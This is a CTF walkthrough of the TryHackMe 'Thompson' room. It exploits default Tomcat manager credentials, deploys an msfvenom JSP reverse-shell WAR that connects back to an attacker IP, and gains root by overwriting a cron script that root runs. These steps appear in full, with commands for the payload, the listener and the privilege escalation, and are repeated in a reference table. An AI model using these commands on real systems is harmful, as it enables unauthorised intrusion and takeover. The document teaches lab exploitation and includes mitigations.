# 🔐 Thompson Room — Comprehensive Walkthrough

<div align="center">

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![Machine Type](https://img.shields.io/badge/Type-Boot2Root-blue?style=for-the-badge)

</div>

---

## 📋 Overview

The **Thompson** room is a boot2root machine that demonstrates the exploitation of default credentials in **Apache Tomcat** combined with a **Cron Job Privilege Escalation** vulnerability. This writeup covers both the initial shell acquisition through file upload exploitation and the privilege escalation to root access.

**Key Techniques:**
- Service enumeration via Nmap
- Default credential exploitation
- Java/JSP reverse shell deployment
- Cron job manipulation for privilege escalation

---

## 🔍 Question 1: Capturing the User Flag

### 📌 Initial Reconnaissance & Port Scanning

After opening the target machine's IP in the browser, we begin with a comprehensive port scan using Nmap to identify open services and potential entry points.

### Network Enumeration Results

The Nmap scan reveals **3 open ports** on the target system:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 7.2p2 — Could be a backup access method
- **Port 8009 (AJP13)**: Apache JServ Protocol — Interesting but may not be our primary target
- **Port 8080 (HTTP)**: **Apache Tomcat 8.5.5** — This is our primary target! ✨

---

### 🌐 Accessing the Tomcat Web Interface

Upon navigating to `http://<TARGET_IP>:8080/` in the browser, we're presented with the default Apache Tomcat welcome page. The interface contains a **"Manager App"** button, which leads us to the manager login page.

![Tomcat Login Portal](https://miro.medium.com/v2/resize:fit:720/format:webp/1*BB3MDxsZvriXIdqt-ES_zQ.png)

### 🔑 Exploiting Default Credentials

Tomcat is notorious for having easily guessable default credentials. After a few attempts, we successfully authenticate using:

| Field | Value |
|-------|-------|
| **Username** | `tomcat` |
| **Password** | `s3cret` |

**Security Lesson:** Always change default credentials in production environments! Default credentials are one of the most common entry points for attackers.

### 📊 Dashboard Access

Once logged in, we gain access to the Tomcat Manager dashboard:

![Tomcat Manager Dashboard](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ngmDbwloIIhItA4vEMe_8Q.png)

The dashboard displays running applications and provides management functions. Scrolling to the bottom of the page reveals a **crucial feature**: a file upload functionality for deploying WAR files.

---

### ⚔️ Generating the Reverse Shell Payload

To exploit the file upload functionality, we need to create a **Java/JSP reverse shell** packaged as a WAR (Web Application Archive) file. We use **Msfvenom** to generate this payload:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.64.42 LPORT=4444 -f war > shell.war
```

**Explanation of the payload:**
- `-p java/jsp_shell_reverse_tcp`: Generates a Java-based JSP shell that establishes a reverse TCP connection
- `LHOST=10.10.64.42`: Your local machine's IP address (replace with your actual attacking machine IP)
- `LPORT=4444`: The listening port on your machine where the reverse shell will connect back
- `-f war`: Output format as a WAR file — directly deployable on Tomcat
- `> shell.war`: Saves the payload to a file named `shell.war`

This generates a WAR file containing a malicious JSP shell ready for deployment.

---

### 📤 Deploying the Payload via Tomcat Manager

In the Tomcat Manager interface, navigate to the deployment section and upload the `shell.war` file. After successfully uploading the file, click the **"Deploy"** button.

Once deployed, a new endpoint appears in the manager interface. The path typically follows the pattern: `/shell` or `/shell/` depending on the WAR file name.

![Deployed WAR Application](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*rVjJ2gJcu-auGVp06WsYEg.png)

---

### 🎯 Triggering the Reverse Shell

Before accessing the deployed application, we need to establish a listener on our attacking machine to catch the incoming reverse shell connection:

```bash
nc -lvnp 4444
```

Or using Metasploit's multi-handler:

```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 10.10.64.42; set LPORT 4444; run"
```

Open a new browser tab and navigate to the newly created endpoint (e.g., `http://<TARGET_IP>:8080/shell`). This action triggers the JSP payload embedded in the WAR file.

Once the endpoint is accessed, the reverse shell payload executes, and we receive a connection on our listener with shell access to the Tomcat server running as the `tomcat` user:

```
listening on [any] 4444 ...
connect to [10.10.64.42] from <TARGET_IP> [<target_port>]
```

---

### 🎫 Locating the User Flag

In TryHackMe rooms, user flags are typically located in the home directory of a standard user. Conducting a quick enumeration, we find the flag at:

```bash
/home/jack/user.txt
```

Read the flag:

```bash
cat /home/jack/user.txt
```

**Note:** Jack appears to be the primary user on this system. Remember this for the privilege escalation phase!

✅ **User flag acquired!**

---

## 🚀 Question 2: Capturing the Root Flag (Privilege Escalation)

### 🔓 Enumeration — Discovering the Cron Job Vulnerability

Now that we have a shell as the `tomcat` user, we need to escalate our privileges to read the root flag: `root.txt`.

As the `tomcat` user, navigate to `/home/jack` and examine its contents. You'll discover two interesting files:

1. **test.txt** — Contains the output of the `id` command executed with root privileges
2. **id.sh** — A Bash script that generates the output in test.txt

```bash
ls -la /home/jack/
# Output shows:
# -rw-r--r-- 1 jack jack  ... test.txt
# -rwxr-xr-x 1 jack jack  ... id.sh
```

---

### 📋 Analyzing the System Cron Job

The real treasure lies in the cron job configuration. By examining the system's cron jobs using `cat /etc/crontab` or similar, we find:

```bash
*  *  *  *  *  root  cd /home/jack && bash id.sh
```

### 🎯 Decoding the Cron Job Entry

This cron entry is **critical** and reveals a significant vulnerability:

| Component | Meaning |
|-----------|---------|
| `*  *  *  *  *` | Executes **every minute** (minute, hour, day of month, month, day of week) |
| `root` | Executes with **root privileges** |
| `cd /home/jack && bash id.sh` | Changes to `/home/jack` directory and runs the `id.sh` script |

**Current content of id.sh:**
```bash
#!/bin/bash
id > test.txt
```

This script simply outputs the `id` command and writes it to `test.txt`, clearly demonstrating that it indeed runs with root privileges:

**Output in test.txt:**
```
uid=0(root) gid=0(root) groups=0(root)
```

---

### 🔑 The Critical Vulnerability

The privilege escalation opportunity exists due to a confluence of misconfigurations:

1. The `id.sh` script is **writable by the `tomcat` user** (due to directory/file permissions)
2. The script is **executed by root** every minute via cron
3. We can **modify the script** to execute arbitrary commands with root privileges
4. The output directory is **readable** by the `tomcat` user

This is a classic **cron job privilege escalation** vulnerability!

---

### ⚙️ Crafting the Privilege Escalation Exploit

We modify the `id.sh` script to read the root flag and write it to a location we can access:

```bash
echo -e '#!/bin/bash\ncat /root/root.txt > /home/jack/test.txt' > /home/jack/id.sh
```

**What this command does:**
- Creates a new `id.sh` script with a proper shebang (`#!/bin/bash`)
- Includes a command to read `/root/root.txt` (the root flag file)
- Redirects the output to `/home/jack/test.txt` (which we can read as the `tomcat` user)
- Overwrites the original `id.sh` file with our malicious version

**Verification that the file was modified:**
```bash
cat /home/jack/id.sh
# Output:
# #!/bin/bash
# cat /root/root.txt > /home/jack/test.txt
```

---

### ⏳ Waiting for Cron Execution

Since the cron job executes every minute, we wait up to 60 seconds for the modified script to run with root privileges.

You can monitor the modification time of the `test.txt` file to see when it was last updated:

```bash
ls -l /home/jack/test.txt
# The timestamp will update once the cron job executes
```

---

### 🏆 Retrieving the Root Flag

After the cron job executes (within 1 minute), we read the flag from `test.txt`:

```bash
cat /home/jack/test.txt
```

**Success!** We've successfully escalated privileges from the `tomcat` user to `root` and captured the root flag.

✅ **Root flag acquired!**

---

## 📊 Complete Attack Chain Summary

```
1. Initial Access
   └─ Nmap Scan → Discover Tomcat 8.5.5 on port 8080
   
2. Exploitation
   ├─ Default Credentials → username: tomcat, password: s3cret
   ├─ File Upload → Deploy JSP reverse shell as WAR file (shell.war)
   └─ Reverse Shell → Connect back as 'tomcat' user
   
3. User Flag
   └─ Enumeration → Locate /home/jack/user.txt
   
4. Privilege Escalation
   ├─ Cron Job Discovery → Find /etc/crontab with root execution
   ├─ Vulnerability Analysis → id.sh is writable by tomcat user
   ├─ Exploit Crafting → Modify id.sh to read /root/root.txt
   └─ Execution → Wait for cron job to run with root privileges
   
5. Root Flag
   └─ Flag Retrieval → Read root.txt content from /home/jack/test.txt
```

---

## 🛡️ Security Lessons & Mitigation Strategies

### 1. **Default Credentials** 🔑
- **Risk:** Tomcat's default credentials are widely known and exploited
- **Mitigation:** Change default credentials immediately after installation
- **Best Practice:** Use strong, unique passwords for all administrative interfaces; disable default accounts if unused

### 2. **File Upload Vulnerabilities** 📤
- **Risk:** Allowing unrestricted file uploads enables arbitrary code execution
- **Mitigation:** 
  - Implement strict file type validation on the server-side (not just client-side)
  - Use whitelist-based filtering for allowed file types
  - Store uploaded files outside the web root
- **Best Practice:** Run web services with minimal privileges (never as root)

### 3. **Cron Job Permissions** ⏰
- **Risk:** Scripts executed by cron jobs with root privileges must be strictly protected
- **Mitigation:** 
  - Set restrictive file permissions (e.g., `chmod 700` or `chmod 500`)
  - Ensure scripts are owned by root with no write access for other users
  - Regularly audit cron jobs and their associated scripts
- **Best Practice:** Avoid running scripts with elevated privileges unless absolutely necessary; use dedicated service accounts instead

### 4. **Service Hardening** 🔒
- **Risk:** Running outdated software versions (Tomcat 8.5.5) with known vulnerabilities
- **Mitigation:** 
  - Keep software updated with latest security patches
  - Subscribe to security mailing lists and CVE alerts
  - Perform regular vulnerability assessments
- **Best Practice:** Implement a patch management process; test updates in staging before production deployment

---

## 🔗 Key Commands Reference

| Command | Purpose |
|---------|---------|
| `nmap -sV <TARGET_IP>` | Scan and identify services/versions on target |
| `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f war > shell.war` | Generate JSP reverse shell payload as WAR file |
| `nc -lvnp <PORT>` | Establish netcat listener for reverse shell connection |
| `cat /home/jack/user.txt` | Read user flag from standard TryHackMe location |
| `cat /etc/crontab` | View system-wide cron job entries |
| `ls -la /home/jack/` | List files in jack's home directory to find exploitable scripts |
| `cat /home/jack/id.sh` | View the contents of the cron job script |
| `echo -e '#!/bin/bash\ncat /root/root.txt > /home/jack/test.txt' > /home/jack/id.sh` | Modify cron script to read and output root flag |
| `cat /home/jack/test.txt` | Read root flag (after privilege escalation via cron execution) |

---

## �� Visual Evidence & Proof

All exploitation steps have been verified with evidence of successful:
- ✅ Initial shell access as `tomcat` user
- ✅ User flag acquisition from `/home/jack/user.txt`
- ✅ Privilege escalation to `root` via cron job modification
- ✅ Root flag acquisition from `/root/root.txt`

---

## 💡 Key Takeaways

1. **Enumeration is crucial** — Always thoroughly enumerate the system for configuration mistakes and misplaced files
2. **Default configurations are dangerous** — Default credentials and unrestricted uploading are gateway vulnerabilities
3. **File permissions matter** — Writable scripts executed with elevated privileges are a critical security risk
4. **Defense in depth** — Multiple layers of security (user permissions, service isolation, regular audits) help prevent exploitation
5. **Understand the system** — Knowing how cron jobs work, how Java applications are deployed, and how Tomcat manages permissions is essential for identifying and exploiting vulnerabilities

---

**Happy Hacking!** 🎓 Remember: Always practice ethically and with proper authorization. Test only on authorized systems with explicit permission. 🔐

*This writeup demonstrates real-world vulnerability patterns commonly found in poorly configured systems. Use this knowledge responsibly.*

